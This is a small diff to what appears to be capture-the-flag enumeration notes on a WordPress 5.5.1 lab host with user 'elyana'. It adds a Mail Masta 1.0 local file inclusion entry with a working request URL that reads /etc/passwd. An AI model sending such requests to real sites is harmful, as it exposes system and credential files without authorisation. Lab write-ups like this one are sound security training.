@@ -122,6 +122,8 @@ WordPress version 5.5.1
 WordPress theme in use: twentytwenty 
 found user elyana
 
+### Mail Masta 1.0 - Local File Inclusion
+http://10.10.42.166/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
 
 
